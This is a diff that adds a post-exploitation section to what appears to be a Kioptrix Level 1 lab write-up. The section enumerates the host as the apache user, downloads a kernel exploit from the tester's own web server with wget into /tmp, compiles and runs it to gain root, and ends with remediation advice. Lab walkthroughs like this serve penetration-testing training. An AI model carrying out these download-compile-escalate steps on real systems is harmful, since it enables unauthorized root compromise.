@@ -93,6 +93,56 @@ _____________________________________
  root <Not need to privilege>
  id
  uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
+  privilege   (post exploitation)
+ 
+ 1- Enumeration:
+ 
+ bash-2.05$ whoami
+ apache
+ 
+ bash-2.05$uname -a
+ Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
+               ________________
+               
+ 2-Transfer Exploit:
+ 
+ in other terminal :
+ python3 -m http.server    open web page to download vuln  < linux kernel 2.2.x /2.4.x >
+ 
+  bash-2.05$ cd /tmp
+ cd /tmp           its doesn't need a Permission 
+ bash-2.05$ wget http://<MY IP>:8000/3.c
+             ________________
+             
+3- Compile & Run
+
+ bash-2.05$ gcc -o privilege 3.c
+ bash-2.05$ ls 
+ 3.c
+ privilege
+
+ bash-2.05$ ./privilege
+ [+] Attached to 6352
+[+] Waiting for signal
+[+] Signal caught
+[+] Shellcode placed at 0x4001189d
+[+] Now wait for suid shell...
+whoami
+root
+id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
+       _______________________
+ 
+       
+ Remediation :
+ 
+ 1- Update the kernel to a modern, supported version; version 2.4.7 contains known vulnerabilities for which no patches exist.
+ 
+ 2-Ensure that Apache does not run with privileges that allow it to access the /tmp directory, compile code, or execute exploits.
+
+ 3-Monitor for any suspicious files being created in /tmp.
+
+
  
  
 
